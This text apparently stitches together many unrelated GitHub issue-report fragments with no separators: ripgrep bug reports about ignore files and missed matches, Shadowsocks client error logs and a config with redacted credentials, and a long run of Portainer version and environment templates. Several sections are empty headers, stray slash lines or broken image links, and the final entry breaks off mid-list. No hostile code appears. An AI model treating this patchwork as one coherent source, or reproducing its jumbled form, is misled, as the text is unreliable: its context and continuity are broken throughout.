arch linux #### describe your question, feature request, or bug
the `--hidden` and `.ignore` file combination is not working well for ignored files inside hidden directories e.g
a `.a/b/c` file shouldn't appear if `.ignore` contains `.a/b`
#### if this is a bug, what are the steps to reproduce the behavior? ```bash
mkdir -p .a/b .a/c
touch .a/b/file .a/c/file
echo .a/b > .ignore
ln -rsf .ignore .gitignore
rg --debug --hidden --files .
``` #### if this is a bug, what is the actual behavior? this is the current output:
debug/rg::config/src/config.rs:42: /home/user/.config/ripgrep/ripgreprc: arguments loaded from config file: ["--smart-case", "--follow"]
debug/rg::args/src/args.rs:143: final argv: ["rg", "--smart-case", "--follow", "--debug", "--hidden", "--files", "."]
debug/grep::search/grep/src/search.rs:195: regex ast:
repeat { e: literal { chars: [ 'z' ], casei: true }, r: range { min: 0, max: some( 0 ) }, greedy: true
debug/globset/globset/src/lib.rs:396: glob converted to regex: glob { glob: ".local/share/nvim/{bundle,undo,swap}", re: "(?-u)^\\\\.local/share/nvim/(swap|undo|bundle)$", opts: globoptions { case_insensitive: false, literal_separator: true }, tokens: tokens([literal(\'.\'), literal(\'l\'), literal(\'o\'), literal(\'c\'), literal(\'a\'), literal(\'l\'), literal(\'/\'), literal(\'s\'), literal(\'h\'), literal(\'a\'), literal(\'r\'), literal(\'e\'), literal(\'/\'), literal(\'n\'), literal(\'v\'), literal(\'i\'), literal(\'m\'), literal(\'/\'), alternates([tokens([literal(\'s\'), literal(\'w\'), literal(\'a\'), literal(\'p\')]), tokens([literal(\'u\'), literal(\'n\'), literal(\'d\'), literal(\'o\')]), tokens([literal(\'b\'), literal(\'u\'), literal(\'n\'), literal(\'d\'), literal(\'l\'), literal(\'e\')])])]) }
debug/globset/globset/src/lib.rs:401: built glob set; 4 literals, 1 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 1 regexes
debug/globset/globset/src/lib.rs:401: built glob set; 1 literals, 0 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug/globset/globset/src/lib.rs:401: built glob set; 1 literals, 0 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
``` #### if this is a bug, what is the expected behavior? the same files shown by `git status` (after a `git init && git add .`): ```
on branch master no commits yet changes to be committed: (use "git rm --cached <file>..." to unstage) new file: .a/c/file new file: .gitignore new file: .ignore ``` as you can see, the `.a/b/file` was ommited by git, but not by ripgrep.
osx ### what i'm observing: rg --no-heading --line-number-width=10 packages ```
source/dubregistry/dbcontroller.d: 289: m_packages.update(["_id": packid], ["$set": ["stats": stats]]);
source/dubregistry/dbcontroller.d: 345: auto res = m_packages.aggregate(["$group": group], ["$project": project]);
source/dubregistry/dbcontroller.d: 371: foreach( bp; m_packages.find() ){
source/dubregistry/dbcontroller.d: 380: m_packages.update(["_id": p._id], ["$set": ["versions": newversions]]);
source/dubregistry/web.d: 46: dbpackage[] m_packages;
source/dubregistry/web.d: 66: package[] packages;
source/dubregistry/web.d: 77: dbpackage[] packages;
``` ### what i'd expect that the line numbers would align wrt left margin (ie that they'd all lign up), not that they'd align wrt rightmost character of path (which has variable position due to different path lengths)
distributor id: ubuntu
description: ubuntu 17.10
release: 17.10
codename: artful
> uname -srvpoi
linux 4.13.0-31-generic #34-ubuntu smp fri jan 19 16:34:46 utc 2018 x86_64 x86_64 gnu/linux
#### if this is a bug, what are the steps to reproduce the behavior? download [rgbug.tar.gz]( unpack, enter the contained directory, then search for `clone_created`
#### if this is a bug, what is the actual behavior? #### if this is a bug, what is the expected behavior? following the reproduction instructions will show a result from file `one.ts`, it should also show a result from `two.ts`
if used with the `-i` or `-s` flags, both results are shown as expected.
os x 10.11.6 #### describe your question, feature request, or bug
i found a case where `ripgrep` fails to find some matching lines when it should
if i tweak the pattern slightly, it will find the lines
changing the contents of the files also can bring the missing lines back into the result set
i was searching a repo of several thousand java files for an endpoint containing the path "/upsert/rateplans"
i initially used "/upsert/rate" as the pattern
`rg` found some matches, but not the one i was looking for
extending the pattern to "/upsert/ratep" brings in the expected match
omitting the leading slash like "upsert/rate" will also yield correct results
i tried stripping down the files to just the matching lines for a minimal test corpus, but `rg` finds everything in that case
i can restrict the search to just three files and reproduce the problem, however
#### if this is a bug, what are the steps to reproduce the behavior? i copied the three files with expected matches to a new directory and stomped most lines with `sed -e \'/upsert/!s/[a-za-z]/a/g\'` (replace all letters with "a" on lines not containing "upsert")
here are the scrubbed files:
sorry for all the "aaaaa" spam, but it seems to be somewhat necessary to reproduce the bug.
also if i change the scrub command to `sed -e '/upsert/!s/./-/g'` then the matches show up again, so there seems to be something more going on than just the byte offset of the match text in the corpus
expected matches:
[josh@yawp rg2]$ grep -nhrf /upsert/rate .
./one.java:115: .setserver(" ");
./three.java:141: private static final string upsert_rate_plans_endpoint = "/v1/upsert/rateplans";
./two.java:43: private static final string dari_rate_path = "/upsert/rates";
``` ripgrep results (missing "three.java:141"):
[josh@yawp rg2]$ rg --debug --no-heading -f /upsert/rate
debug:grep::search: regex ast:
literal { chars: [ '/', 'u', 'p', 's', 'e', 'r', 't', '/', 'r', 'a', 't', 'e' ], casei: false
debug:grep::literals: literal prefixes detected: literals { lits: [complete(/upsert/rate)], limit_size: 250, limit_class: 10 }
one.java:115: .setserver(" ");
two.java:43: private static final string dari_rate_path = "/upsert/rates";
``` tweaked successful match:
[josh@yawp rg2]$ rg --debug --no-heading -f upsert/rate
debug:grep::search: regex ast:
literal { chars: [ 'u', 'p', 's', 'e', 'r', 't', '/', 'r', 'a', 't', 'e' ], casei: false
debug:grep::literals: literal prefixes detected: literals { lits: [complete(upsert/rate)], limit_size: 250, limit_class: 10 }
one.java:115: .setserver(" ");
three.java:141: private static final string upsert_rate_plans_endpoint = "/v1/upsert/rateplans";
two.java:43: private static final string dari_rate_path = "/upsert/rates";
/
/
/
[2020-01-27 14:00:44] current language is: zh-cn
[2020-01-27 14:00:45] shadowsocks started (4.1.9.2)
[2020-01-27 14:01:08] shadowsocks started (4.1.9.2)
[2020-01-27 14:01:11] shadowsocks started (4.1.9.2)
[2020-01-27 14:01:14] shadowsocks started (4.1.9.2)
[2020-01-27 14:01:17] shadowsocks started (4.1.9.2)
[2020-01-27 14:01:17] shadowsocks started (4.1.9.2)
[2020-01-27 14:02:11] system.argumentexception: no server configured shadowsocks.controller.tcphandler.createremote() shadowsocks.controller.tcphandler.startconnect()
[2020-01-27 14:02:11] system.argumentexception: no server configured shadowsocks.controller.tcphandler.createremote() shadowsocks.controller.tcphandler.startconnect()
[2020-01-27 14:02:11] system.argumentexception: no server configured shadowsocks.controller.tcphandler.createremote() shadowsocks.controller.tcphandler.startconnect()
[2020-01-27 14:02:11] system.argumentexception: no server configured shadowsocks.controller.tcphandler.createremote() shadowsocks.controller.tcphandler.startconnect()
[2020-01-27 14:02:11] system.argumentexception: no server configured shadowsocks.controller.tcphandler.createremote() shadowsocks.controller.tcphandler.startconnect()
/
/
/
/
/
[2019-12-22 13:13:29] current language is: ru-ru
[2019-12-22 13:13:29] [e] system.typeinitializationexception: "shadowsocks.controller.i18n"
---> system.indexoutofrangeexception:
shadowsocks.controller.i18n.init(string res, string locale) shadowsocks.controller.i18n..cctor() --- --- shadowsocks.controller.i18n.getstring(string key, object[] args) shadowsocks.view.menuviewcontroller.createmenuitem(string text, eventhandler click) shadowsocks.view.menuviewcontroller.loadmenu() shadowsocks.view.menuviewcontroller..ctor(shadowsockscontroller controller) shadowsocks.program.main(string[] args)
{ "version": "4.1.8.0", "configs": [ { "server": "xxx", "server_port": 8488, "password": "xxx", "method": "aes-256-gcm", "plugin": "", "plugin_opts": "", "plugin_args": "", "remarks": "xxx", "timeout": 5 } ], "strategy": null, "index": 0, "global": false, "enabled": false, "shareoverlan": false, "isdefault": false, "isipv6enabled": false, "localport": 1088, "portablemode": true, "pacurl": null, "useonlinepac": false, "securelocalpac": true, "availabilitystatistics": false, "autocheckupdate": false, "checkprerelease": false, "isverboselogging": false, "logviewer": { "topmost": false, "wraptext": false, "toolbarshown": false, "font": "cuprum, 11.25pt", "backgroundcolor": "black", "textcolor": "white" }, "proxy": { "useproxy": false, "proxytype": 0, "proxyserver": "", "proxyport": 0, "proxytimeout": 3, "useauth": false, "authuser": "", "authpwd": "" }, "hotkey": { "switchsystemproxy": "", "switchsystemproxymode": "", "switchallowlan": "", "showlogs": "", "servermoveup": "", "servermovedown": "", "reghotkeysatstartup": false }
/
/
/
/
/
[e] decryption error
/
p
cptun
\\kcptun.exe
-c \\config.json
config.json:
{ "key": " ", "crypt": "salsa20", "mode": "manual", "conn": 1, "autoexpire": 300, "mtu": 1300, "sndwnd": 512, "rcvwnd": 1024, "datashard": 30, "parityshard": 15, "dscp": 46, "nocomp": true, "acknodelay": false, "nodelay": 0, "interval": 20, "resend": 2, "nc": 1, "sockbuf": 4194304, "keepalive": 10, "quiet": true
} cptun
\\kcptun.exe
-key -crypt salsa20 -mode manual -conn 1 -autoexpire 300 -mtu 1300 -sndwnd 512 -rcvwnd 1024 -datashard 30 -parityshard 15 -dscp 46 -nocomp true -acknodelay false -nodelay 0 -interval 20 -resend 2 -nc 1 -sockbuf 4194304 -keepalive 10 kcptun
ip003
/
all logs are simply shadowsocks started
``` [e] system.nullreferenceexception: object reference not set to an instance of an object
at shadowsocks.util.systemproxy.sysproxy.setieproxy(boolean enable, boolean global, string proxyserver, string pacurl) at shadowsocks.controller.systemproxy.update(configuration config, boolean forcedisable, pacserver pacsrv) at shadowsocks.controller.shadowsockscontroller.reload() at shadowsocks.program.main()
[2017-04-20 17:29:20] system.reflection.targetinvocationexception: exception has been thrown by the target of an invocation
---> system.argumentexception: destination array was not long enough
check destindex and length, and the array's lower bounds
at system.array.copy(array sourcearray, int32 sourceindex, array destinationarray, int32 destinationindex, int32 length, boolean reliable) at system.array.copyto(array array, int32 index) at shadowsocks.encryption.stream.streamencryptor.legacyderivekey(byte[] password, byte[] key) at shadowsocks.encryption.stream.streamencryptor.initkey(string password) at shadowsocks.encryption.stream.streamencryptor..ctor(string method, string password) at shadowsocks.encryption.stream.streammbedtlsencryptor..ctor(string method, string password) --- end of inner exception stack trace --- at system.runtimemethodhandle.invokemethod(object target, object[] arguments, signature sig, boolean constructor) at system.reflection.runtimeconstructorinfo.invoke(bindingflags invokeattr, binder binder, object[] parameters, cultureinfo culture) at shadowsocks.encryption.encryptorfactory.getencryptor(string method, string password) at shadowsocks.controller.tcphandler.createremote() at shadowsocks.controller.tcphandler.startconnect()
[2016-11-25 11:32:27] ha switching to server: jp01******
[2016-11-25 11:32:31] ha switching to server: jp06******
[2016-11-25 11:32:32] ha switching to server: jp01******
[2016-11-25 11:36:16] ha switching to server: sg03******
[2016-11-25 11:36:22] sg03****** timed out
[2016-11-25 11:36:26] sg03****** timed out
[2016-11-25 11:36:26] sg03****** timed out
[2016-11-25 11:37:15] ha switching to server: jp01******9
[2016-11-25 11:38:26] ha switching to server: sg01******9
[2016-11-25 11:38:30] [e] system.invalidoperationexception: system.throwhelper.throwinvalidoperationexception(exceptionresource resource) system.collections.generic.list`1.enumerator.movenextrare() system.collections.generic.list`1.enumerator.movenext() system.linq.enumerable.wherelistiterator`1.movenext() system.collections.generic.list`1..ctor(ienumerable`1 collection) system.linq.enumerable.tolist[tsource](ienumerable`1 source) shadowsocks.model.statisticsrecord..ctor(string identifier, icollection`1 inboundspeedrecords, icollection`1 outboundspeedrecords, icollection`1 latencyrecords) shadowsocks.controller.availabilitystatistics.updaterecords() shadowsocks.controller.availabilitystatistics.run(object _) system.threading.timerqueuetimer.callcallbackincontext(object state) system.threading.executioncontext.runinternal(executioncontext executioncontext, contextcallback callback, object state, boolean preservesyncctx) system.threading.executioncontext.run(executioncontext executioncontext, contextcallback callback, object state, boolean preservesyncctx) system.threading.timerqueuetimer.callcallback() system.threading.timerqueuetimer.fire() system.threading.timerqueue.firenexttimers() system.threading.timerqueue.appdomaintimercallback()
[2016-11-25 11:38:47] ha switching to server: jp06******
[2016-11-25 11:40:11] ha switching to server: sg02******
[2016-11-25 11:40:40] ha switching to server: jp01******
[2016-11-25 11:41:58] ha switching to server: sg03******
![image](
![image](
[2016-10-11 16:47:03] system.nullreferenceexception: object reference not set to an instance of an object
at shadowsocks.controller.tcphandler.close()
[2016-10-11 16:47:05] shadowsocks started
[2016-10-11 16:51:15] sg-krypt-1:8389 (103.233.82.21:8389) timed out
[2016-10-11 16:53:19] [e] exception type: indexoutofrangeexception
stack trace: at system.windows.forms.listbox.itemarray.getitem(int32 virtualindex, int32 statemask) at system.windows.forms.listbox.get_selecteditem() at shadowsocks.view.configform.moveconfigitem(int32 step) at shadowsocks.view.configform.moveupbutton_click(object sender, eventargs e) at system.windows.forms.control.onclick(eventargs e) at system.windows.forms.button.onclick(eventargs e) at system.windows.forms.button.onmouseup(mouseeventargs mevent) at system.windows.forms.control.wmmouseup(message& m, mousebuttons button, int32 clicks) at system.windows.forms.control.wndproc(message& m) at system.windows.forms.buttonbase.wndproc(message& m) at system.windows.forms.button.wndproc(message& m) at system.windows.forms.control.controlnativewindow.onmessage(message& m) at system.windows.forms.control.controlnativewindow.wndproc(message& m) at system.windows.forms.nativewindow.callback(intptr hwnd, int32 msg, intptr wparam, intptr lparam)
[2016-10-11 16:53:21] system.nullreferenceexception: object reference not set to an instance of an object
at shadowsocks.controller.tcphandler.close()
`[2016-09-30 11:26:01] system.reflection.targetinvocationexception: an exception occurred during the operation, making the result invalid
check innerexception for exception details
---> system.net.webexception: an exception occurred during a webclient request
---> system.io.ioexception: received an unexpected eof or 0 bytes from the transport stream
at system.net.connectstream.endread(iasyncresult asyncresult) at system.net.webclient.downloadbitsreadcallbackstate(downloadbitsstate state, iasyncresult result) --- end of inner exception stack trace --- --- end of inner exception stack trace --- at system.componentmodel.asynccompletedeventargs.raiseexceptionifnecessary() at shadowsocks.controller.updatechecker.http_downloadstringcompleted(object sender, downloadstringcompletedeventargs e)`
- portainer version: 2.0
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run
- browser: firefox
- portainer version:
- docker version (managed by portainer): 19.03.13
- platform (windows/linux): linux, centos 7
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy -c portainer-agent-stack.yml portainer
- 2 compose stacks (for 1.24.1 and 2.0.0): [portainer-compose.zip](
- browser: firefox
- portainer version: ce
- docker version (managed by portainer): 19.03.13
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run
- browser: firefox, chrome
- portainer version: 1.23.1
- docker version (managed by portainer): 19.03
- platform (windows/linux): rhel
- command used to start portainer: `docker -c swarm1 stack deploy -c portainer-compose.yml portainer`
- browser: any
- portainer version: `2.0.0` (occurs even in all older versions like `1.24.1`)
- docker version: `19.03.13 (api: 1.40)`
- platform: `linux x86_64 centos linux 7 (core)`
- command used to start portainer: `sudo docker run --restart unless-stopped --name portainer -d -p 127.0.0.1:9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:latest`
- browser: firefox v80
browser: microsoft edge
version 85.0.564.68 ![logged_in](
- portainer version: 1.24.1, ee:develop
- docker version (managed by portainer): 19.03.13
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
- browser: firefox
- portainer version: 2.0.0
- platform (windows/linux): linux
- portainer version: docker image latest
- docker version (managed by portainer): - platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce
- browser: n/a
- portainer version: 2.0.0
- docker version (managed by portainer): 18.09.8
- platform (windows/linux): linux (synology nas)
- command used to start portainer:
`docker run -d -p 9091:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /volume1/nas3dockervolumes/portainer/data:/data portainer/portainer-ce:2.0.0`
- browser: microsoft edge version 85.0.564.51 (official build) (64-bit)
- portainer version: 1.22.0 (trying to upgrade to 1.22.1)
- docker version (aks): 3.0.10+azure
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
- browser: n/a
- portainer version: 2.0.0
- docker version (managed by portainer): 19.03.13
- platform (windows/linux): linux
- browser: chrome
* portainer version: portainer-ce: latest
* target docker version (the host/cluster you manage): 19.03
* platform (windows/linux): ubuntu 18.04
* command used to start portainer: deployed as a stack
* target swarm version (if applicable): 19.03
* browser: edge stack file:
version: \'3.2\' services: agent: image: portainer/agent volumes: - /var/run/docker.sock:/var/run/docker.sock - /var/lib/docker/volumes:/var/lib/docker/volumes networks: - agent_network deploy: mode: global placement: constraints: [node.platform.os == linux] portainer: image: portainer/portainer-ce command: -h tcp://tasks.agent:9001 --tlsskipverify ports: - "9000:9000" - "8000:8000" volumes: - data-local-nfs4-v2:/data networks: - agent_network deploy: mode: replicated replicas: 1 placement: constraints: [node.role == manager] networks: agent_network: driver: overlay attachable: true volumes: data-local-nfs4-v2: driver: local driver_opts: type: nfs4 o: "addr=192.168.17.96,rw" device: ":/portainer"
- portainer version: 1.24
- portainer version: v2.0.0
- docker version (managed by portainer): 5:19.03.12~3-0~debian-buster
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
- browser: chrome version 85.0.4183.102
- portainer version: portainer ce 2.0
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
- browser: firefox
- portainer version: 2.0.0
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
/usr/local/bin/portainer --bind=127.0.0.1:5294 --tunnel-addr=127.0.0.1 --tunnel-port=3941 --data=/var/lib/portainer --assets=/usr/share/portainer
- browser: chrome 85.0.4183.106
- portainer version: 1.23.2
- docker version (managed by portainer): docker version 19.03.4, build 9013bf583a
- platform (windows/linux): centos linux release 7.8.2003 (core)
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `-h tcp://tasks.agent:9001 --tlsskipverify`
- browser: chrome version 85.0.4183.102 (official build) (64-bit)
- portainer version: 2.0
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): ubuntu
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose.yml, agent with k8s
- browser: chrome
- portainer version: 2.0.0-ce
- docker version (managed by portainer): docker version 19.03.12, build 48a66213fe
- platform (windows/linux): debian stretch
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
- browser: n/a
- portainer version: 2.0.0
- docker version (managed by portainer): 1.19.12
- kubernetes version: v1.18.6+k3s1
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): kubectl apply
- browser: firefox
- portainer version: 2.0.0
- docker version (managed by portainer): 19.03.12
- platform (linux): debian 10
- command used to start portainer (`docker run -d -p 8000:8000 -p 9000:9000 --name portainer --restart unless-stopped -v /var/run/docker.sock:/var/run/docker.sock -v portainer:/data portainer/portainer-ce:2.0.0-alpine`):
- browser: firefox 80
- portainer version: ce 2.0
- docker version (managed by portainer): portainer/portainer-ce:latest
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose file
- browser: chrome
- portainer version: 2.0.0
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose
- browser: chrome
- portainer version: 2.0 (ce) **additional informations** this works of course in portainer before 2.0
agent_secret is set
in any faqs it's not mentioned that this feature was removed in 2.0 (ce).
- portainer version: 2.0
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
- browser: firefox
- portainer version: 1.24.1
- docker version (managed by portainer): docker version 19.03.12, build 48a66213fe
- platform (windows/linux): linux - 4.15.0-112-generic #113-ubuntu smp thu jul 9 23:41:39 utc 2020 x86_64 x86_64 x86_64 gnu/linux - command used to start portainer: sudo docker stack deploy --compose-file=portainer.yml portainer
[portainer.yml]( - browser: microsoft edge, chromium version - 85.0.564.41 (official build) (64-bit)
- portainer version: 1.24.1
- docker version (managed by portainer): standalone 18.06.2-ce
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `--admin-password-file /home/portainer_password` (as shown in the container details page of the portainer container)
- browser: chrome 84.0.4147.135
- portainer version: 2.0
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): windows server 2019
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
- browser: firefox
- portainer version: 1.24.1
- docker version (managed by portainer): 1.19.12
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
- browser: firefox, chrome
- portainer version: 1.24.1
- docker version (managed by portainer): 19.03.12 (multinode swarm)
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
- browser: firefox
- portainer version: 1.24.1
- docker version (managed by portainer): 19.03.8 - platform (windows/linux): linux (arm64 and amd64)
- command used to start portainer (`docker stack deploy -c docker-compose.yml portainer`):
- browser: chrome
- portainer version: 1.24.1
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
- browser: firefox
- portainer version: v1.24.1
- docker version (managed by portainer): any
- platform (windows/linux): any
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): any, with `--no-auth`
- browser: any
- portainer version: 1.23.1
- docker version (managed by portainer): -
- platform (windows/linux): -
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): -
- browser: - **additional info:** - as this error exists since version 1.23.1, it is likely related to the change in #3415
- originally reported in #3937
- portainer version:1.24.0
- docker version (managed by portainer):19.03.6 (api: 1.40)
- platform (windows/linux):linux x86_64 ubuntu 18.04.1 lts
- command used to start portainer :docker run -p 9000:9000 portainer/portainer
- browser: chrome 83.0.4103.116
- portainer version: 1.24.0
- docker version (managed by portainer): latest
- platform (windows/linux): linux
- portainer version: 1.24.1
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): linux
- command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
- browser: firefox
- portainer version: 1.24.0
- docker version (managed by portainer): 19.03.12
- platform (windows/linux): debian buster
* portainer version: latest
* docker version (managed by portainer): 19.03.12
* platform (windows/linux): ubuntu 20.04 lts
* command used to start portainer: `docker volume create portainer_data` `docker run -d -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer`
* browser: n/a
* portainer version: 1.24.0, 2.0.0-dev
* docker version (managed by portainer): 19.03.12
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox
* portainer version: 1.24.0
* docker version (managed by portainer): not relevant
* platform (windows/linux): linux at least.
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): not relevant * browser: blink-based browser, dunno others.
portainer version: 1.24.0
docker version (managed by portainer): 19.03.11, build 42e35e61f3
platform (windows/linux): linux (debian stretch)
* portainer version: 1.24.0
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux,rpi4 endpoint
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox
* portainer version: 1.24.0
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy ...
* browser: google chrome 83.0.4103.61
* portainer version: 1.23.2, 1.24.0
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox
* portainer version: 1.24.0
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox
* portainer version: 1.24.0-dev
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox
* portainer version: 1.23.2, 1.24.0-dev
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox
* portainer version: 1.23.2 & develop
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox
* portainer version: 1.23.2, 1.24.0, 1.24.1
* target docker version (the host/cluster you manage): swarm 18.06.3-ce
* platform (windows/linux): linux
* browser: chrome, firefox
* portainer version: 1.23.2
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): stack deploy
* browser: firefox, chrome
* portainer version: image latest (i think its 1.23.0)
* docker version: 19.03.5
* platform: linux x86_64 ubuntu 18.04.3 lts
* command used to start portainer: docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
* browser: version 81.0.4044.122 (offizieller build) (64-bit)
* portainer version: 1.23.2
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox
* portainer version: 1.23.2
* docker version (managed by portainer): n/a
* platform (windows/linux): mac
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): <--
* browser: microsoft edge 80.0.361.111
* portainer version: 1.23.2
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux (ubuntu)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy
* browser: firefox, chrome **additional info:**
in my testing i have confirmed this was introduced in portainer v1.23.0 with the ownership rewrite
previous versions are not affected
* portainer version: 1.23.1
* docker version (managed by portainer): standalone 19.03.7
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `sudo docker run -p 9000:9000 portainer`
* browser: google chrome 80.0.3987.149
* portainer version: 1.23.2
* platform (windows/linux): linux
* browser: firefox and chrome
* portainer version: 1.23.2
* docker version (managed by portainer): docker.io deb package 19.03.6
* platform (windows/linux): ubuntu 19.10 eoan
* command used to start portainer: docker run -d -p 9000:9000 -p 8000:8000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
* browser: chromium version 79.0.3945.130 (developer build) built on debian buster/sid, running on debian buster/sid (64-bit)
* portainer version: 1.23.2
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run
* browser: firefox
* portainer version: 1.23.2
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: chrome
* portainer version: 1.23.1
* docker version (managed by portainer): 19.03.5
* platform (windows/linux): windows 10 1909
* command used to start portainer: `docker run -d -p 8000:8000 -p 9000:9000 -v c:\\portainer\\dist:c:\\app -v ' + c:\\tmp\\portainer:c:\\data -v \\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine --name portainer mcr.microsoft.com/windows/nanoserver:1903 c:\\app\\portainer --no-analytics --template-file c:\\app\\templates.json`
* browser: edge 80
* portainer version: 1.23.1
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): linux (ubuntu)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run
* browser: chrome
* portainer version: 1.23.0
* docker version (managed by portainer): 1.19.3
* platform (windows/linux): rhel
* command used to start portainer: docker-compose up
* browser: safari
* portainer version: 1.23.1 (with image `portainerci/portainer:fix3568-bump-go-winio-lib-windows1809-amd64`)
* docker version (managed by portainer): 19.03.5, build 2ee0c57608
* platform (windows/linux): windows server 2019
* command used to start portainer: see attached *docker-compose.yml* below
* browser: firefox
* portainer version: 1.23.1
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): windows 10
* command used to start portainer: `docker run -d -p 8000:8000 -p 9000:9000 --name portainer --restart always -v \\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine -v portainer_data:c:\\data portainer/portainer`
* browser: chrome
* portainer version: 1.23.1
* docker version (managed by portainer): 19.03.3-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
`docker stop portainer &&
docker rm portainer &&
docker rmi portainer/portainer:latest && docker create -p 192.168.10.100:80:9000 --name portainer --restart always \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /docker/core-services/portainer:/data \\ -l portainer.hide=true \\ -l traefik.enable=true \\ -l traefik.frontend.rule=redacted \\ -l traefik.docker.network=traefik_net \\ -l "traefik.frontend.auth.basic=redacted" \\ --net default_net \\ portainer/portainer:latest docker network connect traefik_net portainer &&
docker start portainer`
* portainer version: 1.23.0
* docker version (managed by portainer): 17.05.0-ce, build 89658be
* platform (windows/linux): linux x64 - centos
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker compose, but exactly with documentation config
* portainer version: 1.23.0
* docker version (managed by portainer):
